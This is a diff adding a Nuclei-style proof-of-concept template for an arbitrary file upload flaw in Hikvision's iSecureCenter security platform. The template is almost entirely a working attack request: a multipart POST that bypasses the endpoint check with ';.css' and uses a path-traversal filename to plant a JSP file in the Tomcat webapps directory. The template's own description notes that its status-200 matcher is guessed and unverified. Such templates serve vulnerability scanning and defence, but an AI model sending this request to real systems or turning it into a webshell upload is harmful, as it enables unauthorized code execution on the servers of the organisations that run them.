@@ -1,0 +1,49 @@
+id: poc-6dcfa299064fea1eff66
+info:
+  name: 海康威视iSecureCenter综合安防管理平台lm任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/6dcfa299064fea1eff66f0e6708045f2
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 6dcfa299064fea1eff66f0e6708045f2
+    fofa: '**hunter查询语法：**'
+http:
+- raw:
+  - 'POST /lm/api/files;.css HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: keep-alive
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVBf7Cs8QWsfwC82M
+
+    Content-Length: 342
+
+    SL-CE-SUID: 39
+
+
+    ------WebKitFormBoundaryVBf7Cs8QWsfwC82M
+
+    Content-Disposition: form-data; name="file"; filename="../../../../../tomcat85linux64.1/webapps/els/static/axaaxs.jsp"
+
+    Content-Type: application/zip
+
+
+    <% out.println("testaxssax");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryVBf7Cs8QWsfwC82M--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
